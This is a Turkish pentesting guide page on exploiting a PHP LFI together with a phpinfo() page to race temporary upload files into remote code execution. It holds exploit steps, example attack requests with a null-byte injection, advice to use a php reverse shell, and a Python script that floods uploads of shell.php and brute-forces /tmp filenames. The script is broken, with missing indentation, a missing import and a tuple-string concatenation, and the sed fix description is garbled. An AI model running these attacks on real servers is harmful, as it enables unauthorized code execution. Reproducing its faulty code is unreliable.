{{#include ../../banners/hacktricks-training.md}}

Bu güvenlik açığını istismar etmek için şunlara ihtiyacınız var: **Bir LFI güvenlik açığı, phpinfo()'un görüntülendiği bir sayfa, "file_uploads = on" ve sunucunun "/tmp" dizinine yazabilmesi.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Eğitim HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s)

İstismarı düzeltmeniz gerekiyor ( **=>** yerine **=>** değiştirin). Bunu yapmak için şunları yapabilirsiniz:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Başlangıçta **payload**'u değiştirmelisiniz (örneğin bir php-rev-shell için), **REQ1** (bu phpinfo sayfasına işaret etmeli ve padding içermelidir, yani: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), ve **LFIREQ** (bu LFI zafiyetine işaret etmelidir, yani: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Null karakteri sömürürken çift "%" olduğuna dikkat edin)

{% file src="../../images/LFI-With-PHPInfo-Assistance.pdf" %}

### Teori

Eğer PHP'de yüklemelere izin veriliyorsa ve bir dosya yüklemeye çalışıyorsanız, bu dosya sunucu isteği işleyene kadar geçici bir dizinde saklanır, ardından bu geçici dosya silinir.

Sonra, web sunucusunda bir LFI zafiyeti bulduysanız, oluşturulan geçici dosyanın adını tahmin etmeye çalışabilir ve dosya silinmeden önce geçici dosyaya erişerek bir RCE sömürü yapabilirsiniz.

**Windows**'ta dosyalar genellikle **C:\Windows\temp\php** dizininde saklanır.

**Linux**'ta dosyanın adı genellikle **rastgele** olup **/tmp** dizininde bulunur. Ad rastgele olduğu için, **geçici dosyanın adını bir yerden çıkarmak** ve silinmeden önce buna erişmek gereklidir. Bu, "**phpconfig()**" fonksiyonunun içeriğindeki **$\_FILES** değişkeninin değerini okuyarak yapılabilir.

**phpinfo()**

**PHP** bir **4096B** tamponu kullanır ve bu **dolu olduğunda**, **istemciye gönderilir**. Ardından istemci **birçok büyük istek** (büyük başlıklar kullanarak) **yükleyerek bir php** ters **shell** yükleyebilir, **phpinfo()'un ilk kısmının geri dönmesini bekleyebilir** (geçici dosyanın adı burada bulunur) ve php sunucusu dosyayı silmeden önce **geçici dosyaya erişmeye** çalışabilir, böylece bir LFI zafiyetini sömürebilir.

**İsimleri brute force denemek için Python scripti (uzunluk = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{{#include ../../banners/hacktricks-training.md}}
